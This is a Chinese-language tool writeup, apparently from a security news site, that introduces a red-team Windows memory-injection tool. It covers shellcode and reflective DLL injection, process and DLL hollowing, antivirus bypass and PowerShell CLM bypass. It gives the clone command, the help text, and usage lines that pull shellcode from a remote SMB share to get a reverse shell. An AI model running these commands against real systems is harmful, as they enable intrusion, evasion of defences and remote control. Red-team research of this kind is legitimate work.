![](https://image.3001.net/images/20210828/1630150341_612a1ec5548aa9dd66f59.jpg!small)

## 关于Injector

Injector是一款功能齐全且强大的内存注入工具，该工具集成了多种技术，可以帮助红队研究人员实现在Windows系统下的内存注入。

## Injector能做什么？

针对远程服务器和本地存储提供Shellcode注入支持。只需指定Shellcode文件，该工具将帮助我们完成后续的所有事情。默认情况下，工具会将Shellcode注入至exe，如果没有找到目标进程，它将会创建一个记事本进程，并注入其中实现持久化感染。

支持反射DLL注入，工具将下载DLL并注入远程进程。

通过exe实现进程镂空。

使用-bypass参数，以支持使用更高级的、未记录的API来进行进程注入。

支持加密的Shellcode，比如说AES加密或异或加密等。

支持针对PowerShell的CLM绕过，可以直接将代码存防止能够执行C#代码的白名单文件夹中，比如说“C:\Windows\Tasks”。

支持DLL镂空，通过dll实现。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/0xDivyanshu/Injector.git

## 工具帮助

    
    
    C:\Users\admin>Injector.exe
    
    Help Options for Xenon:
    
    -m       Mode of operation
    
            -m 1     Specifies the mode as Process injection
    
            -m 2     Specifies the mode as Reflective DLL Injection
    
            -m 3     Specifies the mode as Process Hollowing
    
            -m 4     No injection! Give me my damn shell
    
            -m 5     Powershell session via CLM bypass
    
            -m 6     DLL hollowing
    
     
    
    -TempFile        File location that your current user can read
    
    -shellcode       Use shellcode
    
    -dll     Use dll
    
    -decrypt-xor     Specify Xor decryption for shellcode
    
             -pass   Specifty the password for Xor decryption
    
    -decrypt-aes     Specify aes decryption for shellcode
    
             -pass   Specifty the password for aes decryption
    
    -location        Specify the location i.e either server or local
    
    -bypass         Uses enhance attempts to bypass AV

如需生成加密的Shellcode，请在Kali下使用Helper.exe。

## 工具使用样例

    
    
    Injector.exe -m=1 -shellcode -encrypt-aes -pass=password -location="\\192.x.x.x\share\shellcode.txt" -bypass

上述命令将解密你的Shellcode并给你一个反向Shell。

如果你不想使用加密的Shellcode，你也可以直接使用下列命令运行下列命令：

    
    
    Injector.exe -m=1 -shellcode -location="\\192.x.x.x\share\shellcode.txt"

将其中的“-m=1”修改为“2,3,4,6”之后，就可以运行其他模式了：

    
    
    Injector.exe -m=5 -TempFile=C:\\Users\\user\\sample.txt

上述命令将提供要给会话，我们可以使用它来执行IEX cradle，并获取一个能够绕过CLM的反向Shell。

## PowerShell

你还可以使用Invoke-Exe.ps1来通过PowerShel执行Injector：

    
    
    Invoke-Exe -loc C:\Users\john\injector.exe

## 项目地址

 **Injector：** 【[ _GitHub传送门_](https://github.com/0xDivyanshu/Injector)】

## 参考资料

> [ _https://www.ired.team/offensive-security/code-injection-process-> injection/modulestomping-dll-hollowing-shellcode-> injection_](https://www.ired.team/offensive-security/code-injection-process-> injection/modulestomping-dll-hollowing-shellcode-injection)

  

